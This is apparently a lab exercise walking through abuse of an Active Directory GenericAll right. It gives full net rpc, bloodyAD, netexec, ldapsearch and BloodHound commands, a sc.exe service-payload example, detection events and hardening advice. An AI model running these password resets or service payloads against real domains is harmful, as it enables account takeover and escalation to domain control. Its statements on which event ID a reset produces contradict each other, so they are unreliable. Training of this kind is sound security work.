    Exercise 4.1: GenericAll on a User

    Before You Begin

    GenericAll is the ACL equivalent of full ownership. Whoever has it on a user object can read, write, set passwords, set the SPN, set userAccountControl, change membership, and effectively do anything to that user. The most direct exploitation is the password reset: change the target's password to something you control, then authenticate as the target. Exercise 4.1 asks you to walk that exact path against t.morrison_<token>.

    Tools required: bloodhound-python, bloodyAD, net rpc, ldapsearch, netexec.

    Scenario

    Marcus Bell: "BloodHound says IT_HelpDesk has GenericAll on a Server Operators member named t.morrison_<token>. That is a password-reset waiting to happen. Reset it, authenticate, read the user's extensionAttribute2."

    j.chen is a member of IT_HelpDesk. The target's extensionAttribute2 holds your flag.

    Credentials:

    Username Password
    j.chen Welcome2026#

    Domain: corp.nordport.local

    Your Objectives

    • Confirm via BloodHound that IT_HelpDesk has GenericAll on t.morrison_<token>
    • Reset the target's password
    • Authenticate as the target
    • Read extensionAttribute2 over LDAP
    • Submit the flag

    The Path In Pictures

    Each arrow is a single command (or a passive group membership check). The diagram below traces the full chain you will execute.

    How GenericAll Compares to Adjacent Rights

    Several edges yield similar outcomes. The table below ranks them so you know which is fastest to exercise when BloodHound surfaces more than one option.

    Right Steps to compromise Best command
    ForceChangePassword 1 (just reset) net rpc password
    GenericAll 1 (reset, OR set SPN, OR set UAC) net rpc password or bloodyAD set password
    GenericWrite 1 (set SPN, kerberoast) or 1 (set UAC, ASREPRoast) targetedKerberoast.py
    WriteDACL 2 (add ACE, exercise) dacledit.py write then net rpc password
    WriteOwner 3 (own, GenericAll ACE, exercise) bloodyAD set owner chain

    Background: GenericAll, the Right You Almost Always Want

    AD ACLs are a long list of named rights. The most consequential ones for offense, in order of how directly they yield compromise:

    Right What it does Most direct exploit
    GenericAll Full control on the object Reset password, set SPN, set UAC, anything
    WriteOwner Take ownership Take ownership, grant yourself GenericAll, exercise it
    WriteDACL Modify the object's ACL Add an ACE granting yourself GenericAll, exercise it
    ForceChangePassword Reset password without knowing old Direct reset
    GenericWrite Write any property Set SPN (Kerberoast-able), set msDS-AllowedToDelegateTo (constrained delegation abuse)
    WriteProperty (specific) Write a specific attribute Depends on which attribute (e.g., msDS-AllowedToActOnBehalfOfOtherIdentity = RBCD)

    GenericAll collapses everything else into one ACE. If BloodHound shows it, you have the cleanest possible path.

    How GenericAll arises in production

    • Helpdesk delegation gone wide: an admin granted "Help Desk Operators" GenericAll on a whole OU instead of Reset Password.
    • Stale group memberships: an old DA was demoted to a Tier-1 group that historically had GenericAll on Tier-0 users.
    • Service account provisioning errors: a script that auto-provisions users grants GenericAll to its own service account on every user it creates.
    • Sloppy ACL after a project: someone needed write on description for a script in 2018, granted GenericAll for expediency, never reverted.

    The defender control is regular ACL audits with dsacls.exe, BloodHound run against the defender's own domain, or PingCastle. Most environments have at least one GenericAll path; finding all of them quickly is the offense's edge.

    The exploitation: net rpc password

    net rpc password "t.morrison_<token>" "NewPassword2026#" \
  -U "CORP\j.chen%Welcome2026#" -S corp-dc01

    The Samba net command speaks SAMR over RPC. The KDC sees the operation as j.chen setting t.morrison_<token>'s password, which is allowed by the GenericAll ACE. No event 4724 (privileged password reset) is generated; it is event 4723 (user account password change) on the target user.

    The exploitation: bloodyAD

    bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
  set password "t.morrison_<token>" "NewPassword2026#"

    Linux-native, no Samba dependency. Identical effect.

    Tool Primer

    Confirm GenericAll via BloodHound

    Cypher (canonical BHCE form, paste as one line):

    MATCH (g:Group)-[:GenericAll]->(u:User) WHERE g.name = 'IT_HELPDESK@CORP.NORDPORT.LOCAL' RETURN u

    Returns User nodes; the graph view renders them. To see usernames in a list, switch the result panel to Table view and replace RETURN u with RETURN u.name. Or in the UI, select the IT_HelpDesk node and look at "Outbound Object Control" -> GenericAll.

    Reset password

    net rpc password "<target>" "<newpass>" -U "DOM\<src>%<srcpass>" -S <dc>

    Read extensionAttribute over LDAP

    ldapsearch -x -LLL -H ldap://<dc> \
  -D "CORP\<resetuser>" -w '<newpass>' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(sAMAccountName=<resetuser>)" extensionAttribute2

    Walkthrough

    Step 1: Confirm the Path with BloodHound

    Always confirm the path before exercising it. A graph that is hours stale can show edges that were just remediated. The Cypher below asks for the shortest path from your foothold to the target, capped at 6 hops to keep the search tractable.

    Collect the domain first (bloodhound-python -u j.chen -p 'Welcome2026#' -d corp.nordport.local -ns corp-dc01 -c All --zip), ingest into BloodHound CE, then run:

    MATCH p=shortestPath((n:User)-[*1..]->(m:User)) WHERE n.name = 'J.CHEN@CORP.NORDPORT.LOCAL' AND m.name = 'T.MORRISON_<TOKEN>@CORP.NORDPORT.LOCAL' RETURN p

    Canonical BHCE form: single MATCH, single WHERE with AND. Substitute your literal token (uppercase, e.g. T.MORRISON_J001) into the WHERE string.

    You should see J.CHEN -MemberOf-> IT_HELPDESK -GenericAll-> T.MORRISON_<TOKEN>. Names are stored UPPERCASE in BloodHound CE; substitute your literal token (for example T.MORRISON_J001) into the query.

    Step 2: Reset t.morrison_'s Password

    The net rpc password command opens a SAMR handle as j.chen and calls SamrSetInformationUser with the new password. The DC checks j.chen's effective rights on the target object; the GenericAll ACE permits the operation. Pick a strong throwaway value; you will not need it after Step 4.

    Kali - Reset password via SAMR over RPC

    net rpc password "t.morrison_${OCR_SCOPE_TOKEN}" "TempReset2026#" \
  -U "CORP\j.chen%Welcome2026#" -S corp-dc01
    Token Effect
    net rpc password Samba's SAMR password-set wrapper.
    "<target>" First positional: account whose password to set.
    "<newpass>" Second positional: new password value.
    -U "DOM\user%pass" Authenticate as this principal.
    -S <dc> Talk to this server.

    Expected output: Password was changed. Equivalent Linux-native (no Samba dependency):

    bloodyAD -d corp.nordport.local -u j.chen -p 'Welcome2026#' --host corp-dc01 \
  set password "t.morrison_${OCR_SCOPE_TOKEN}" 'TempReset2026#'

    Step 3: Authenticate as the Target

    Confirm the reset took before doing anything else with the credential. A failed reset (silent permission denial) would show up here with STATUS_LOGON_FAILURE and save you a lot of confused troubleshooting.

    Kali - Validate the new credential

    netexec smb corp-dc01 -u "t.morrison_${OCR_SCOPE_TOKEN}" \
  -p 'TempReset2026#' -d corp.nordport.local

    [+] confirms. [-] with STATUS_PASSWORD_MUST_CHANGE means the DC accepted your credential but flagged it for change-on-next-logon (some lockout policies enforce this); bloodyAD change-password after a normal connection clears it.

    Step 4: Read the Target's extensionAttribute2

    With the reset credential you can now bind as the target user and read attributes that only the target itself can see (or that you happen to want to read with their identity). The trailing extensionAttribute2 requests only that single attribute.

    Kali - Pull the flag from extensionAttribute2

    ldapsearch -x -LLL -H ldap://corp-dc01 \
  -D "CORP\t.morrison_${OCR_SCOPE_TOKEN}" -w 'TempReset2026#' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(sAMAccountName=t.morrison_${OCR_SCOPE_TOKEN})" extensionAttribute2
    Token Effect
    -D "CORP\t.morrison_..." Bind DN: authenticate as the reset user.
    -w 'TempReset2026#' The new password from Step 2.
    (sAMAccountName=...) Filter to a single object.
    extensionAttribute2 Trailing attribute list; only this attribute returned.

    The attribute value is the flag.

    Step 5: Submit and Note the Operational Hygiene

    In a real engagement you would now leave a note that the target's password was reset, rotate it back to a randomized strong value when done, and document the new password rotation in your engagement report. For this exercise, just submit the flag.

    Common gotchas

    • Group membership cache: j.chen must already be a member of IT_HelpDesk for the GenericAll grant to apply. If you were just added to the group, log out and re-authenticate; Kerberos caches group SIDs in the TGT for 10 hours by default.
    • DACL inheritance disabled: if t.morrison's user object has DACL inheritance disabled, the OU-wide GenericAll grant may not apply to that one user. BloodHound shows the path, but the actual reset returns STATUS_ACCESS_DENIED. Verify with dacledit.py read.
    • SAMR vs LDAP password set: net rpc password uses SAMR (event 4724). LDAP-based password set via unicodePwd modify uses event 4723. Detection rules sometimes alert on one but not the other.
    • Production reset: never reset a password on a real engagement without coordinating with the customer. The user's next login attempt fails, support tickets get filed, and your stealth budget evaporates.

    Blue Team Perspective

    A password reset by another user is one of the highest-signal events in the Windows security log. Defenders that allow-list legitimate resetters catch this finding fast.

    Activity Event ID Where it fires
    Account password reset by another user 4724 DC Security log
    Object DACL change 5136 DC Security log
    MDI suspicious password reset "Suspicious modification of a sensitive group" Defender for Identity
    Lateral auth as reset user 4624 logon type 3 from new IP Target server log

    Where this attack gets caught

    The single best detection is on event 4724 with an allow-list of legitimate password-reset principals (typically a small set of helpdesk service accounts). Any 4724 issued by a principal not on the allow-list is a high-confidence finding. Microsoft Defender for Identity also fires "Suspicious modification of a sensitive group" if the reset target is a member of any privileged group, which catches the Server Operators chain in this exercise.

    Hardening Note

    ACL hygiene is the work. Most environments have at least one orphaned GenericAll grant from a 2015 ticket that was never reverted.

    Practical ACL hardening

    • Run BloodHound against your own domain quarterly. Sort all GenericAll, WriteOwner, WriteDACL, GenericWrite, ForceChangePassword edges by target sensitivity.
    • Replace blanket helpdesk delegations (GenericAll on whole OUs) with delegated control wizards that grant only Reset Password on a tightly scoped OU.
    • Build a SIEM detection on event 4724 with allow-list of approved resetter principals.
    • Periodically diff BloodHound collections to catch newly added ACEs.
    • Move privileged group members (Server Operators, Backup Operators) to a Tier-0 OU with deny-Authenticated-Users-write ACLs.

    Analysis Questions

    1. The exercise resets the target user's password directly. In a real engagement, what hygiene does an operator follow to avoid breaking production access?

    Reveal Answer

    Hygiene rules: (1) Note the original password (or its hash if you can dump it via DCSync first). (2) Reset to a known-strong randomized value, never something predictable. (3) Document the reset in your engagement notes with a timestamp. (4) When the operation is done, rotate the password back to a randomized value the customer rotates again at engagement close. (5) If the target account is privileged or actively used by a running service, prefer alternative paths (kerberoast first, write SPN to the account and kerberoast, etc.) that do not break the running service. The customer-facing red flag is "we reset Joe's password and Joe could not log in next morning"; experienced consultants either avoid the reset entirely or pre-coordinate it with the engagement contact.

    2. GenericAll on a user gives you everything. Why might an attacker prefer GenericWrite to GenericAll, when both are present?

    Reveal Answer

    Both grant write capability, but GenericWrite is specifically writing properties without the right to read sensitive attributes (in some configurations) and without the right to delete the object. Some defenders monitor GenericAll more aggressively than GenericWrite. An attacker with GenericWrite can still set the SPN (turning the account Kerberoastable), set msDS-AllowedToDelegateTo (constrained delegation abuse), or write userAccountControl to disable pre-auth (turning the account ASREPRoastable). The end-state compromise is the same; the audit trail is quieter. In practice, BloodHound shows both as similarly powerful and most operators exercise whichever is most convenient.

    3. The Server Operators membership on t.morrison_<token> is incidental scenery in this exercise. In a real engagement, why would adding the target to Server Operators (or finding them already in it) make this finding more valuable?

    Reveal Answer

    Server Operators membership is essentially Domain Admin equivalence on Domain Controllers via the "install a service that runs as LOCAL SYSTEM on a DC" technique (covered in exercise 2.4). So a chain that compromises t.morrison_ via GenericAll AND finds them in Server Operators yields a chain that ends in DC SYSTEM. In a report you would represent the chain as j.chen -> IT_HelpDesk -> GenericAll -> t.morrison -> Server Operators -> DC SYSTEM and rate it Critical. The Server Operators membership is what turns "we got a user account" into "we got the domain." Always trace your reset target's group memberships forward to see how high the chain reaches.

    Key Takeaways

    • GenericAll collapses all ACL rights into one ACE; the most direct exploit is password reset.
    • net rpc password and bloodyAD set password both perform the SAMR-level reset.
    • BloodHound's "Outbound Object Control" view enumerates everything a node can change.
    • Operational hygiene: record the original, choose a strong reset value, rotate back at end of engagement.
    • The chain's value depends on the target's group memberships; trace forward to find the maximum impact.

    Cheat Sheet Recap

    The four operations below cover GenericAll exploitation end to end. Use them in this order on any GenericAll edge.

    Goal Command
    Confirm GenericAll path Cypher: MATCH (g:Group)-[:GenericAll]->(u:User) WHERE g.name = '<G>@<DOM>' RETURN u
    Reset password (Samba) net rpc password "<target>" "<newpw>" -U "<DOM>\<atk>%<pw>" -S <dc>
    Reset password (Linux-native) bloodyAD -d <domain> -u <atk> -p '<pw>' --host <dc> set password "<target>" '<newpw>'
    Validate as target netexec smb <dc> -u <target> -p '<newpw>' -d <domain>

    Spaced Repetition

    Card 1: net rpc password Syntax

    Q: Write the net rpc command to reset targetuser's password to NewPwd# using srcuser / SrcPwd# against DC dc01.

    Answer 
    net rpc password "targetuser" "NewPwd#" -U "DOM\srcuser%SrcPwd#" -S dc01

    Outputs Password was changed. on success. The operation is event 4723 (user changes own password) from the DC's perspective because the SAMR handle is opened with the source user's credentials.

    Card 2: bloodyAD Equivalent

    Q: Linux-native equivalent of the above using bloodyAD.

    Answer 
    bloodyAD -d corp.local -u srcuser -p 'SrcPwd#' --host dc01 \
  set password "targetuser" 'NewPwd#'

    bloodyAD performs the same SAMR call without needing Samba's net binary. Useful when running from container shells without Samba installed.

    Card 3: GenericAll vs GenericWrite

    Q: Both grant write capability. What does GenericAll add that GenericWrite does not?

    Answer

    GenericAll grants delete and read-control rights on the object in addition to write; GenericWrite is "write properties only." Some sensitive attribute reads also require the read-control component, though most are readable by Authenticated Users by default. For practical attack purposes, both let you set SPN, set UAC, and reset password (the latter via SAMR which uses a different access mask than the directory write); the difference is that GenericAll lets you also delete the object and modify its ACL. Defender monitoring sometimes treats GenericAll more aggressively, so an attacker with both available will often exercise GenericWrite instead.

    Card 4: BloodHound Cypher for IT_HelpDesk Reach

    Q: Write a Cypher query that returns every user IT_HelpDesk has GenericAll on in corp.local.

    Answer 
    MATCH (g:Group)-[:GenericAll]->(u:User) WHERE g.name = 'IT_HELPDESK@CORP.LOCAL' RETURN u

    Names are UPPERCASE in the graph. To include WriteOwner / WriteDACL paths in one query, use [:GenericAll|WriteOwner|WriteDACL]. To include nested groups (any GenericAll inherited via group nesting): MATCH p=(g:Group)-[:MemberOf*0..]->()-[:GenericAll]->(u:User) WHERE g.name = 'IT_HELPDESK@CORP.LOCAL' RETURN p.

    Card 5: Server Operators Equivalence

    Q: A user with no Domain Admin membership is in Server Operators. Why is that effectively DA on the DC?

    Answer

    Server Operators can install Windows services on Domain Controllers. A service can be configured to run as LOCAL SYSTEM and execute any payload the operator chooses (sc.exe create EvilSvc binPath= "C:\path\to\payload.exe" type= own start= demand then sc.exe start EvilSvc). The payload runs as NT AUTHORITY\SYSTEM on the DC, which has secretsdump-equivalent rights, can write to LSASS, and can perform any Tier-0 action. So Server Operators on a DC = effective DA. Defenders should empty Server Operators or restrict it to genuinely necessary, monitored accounts.
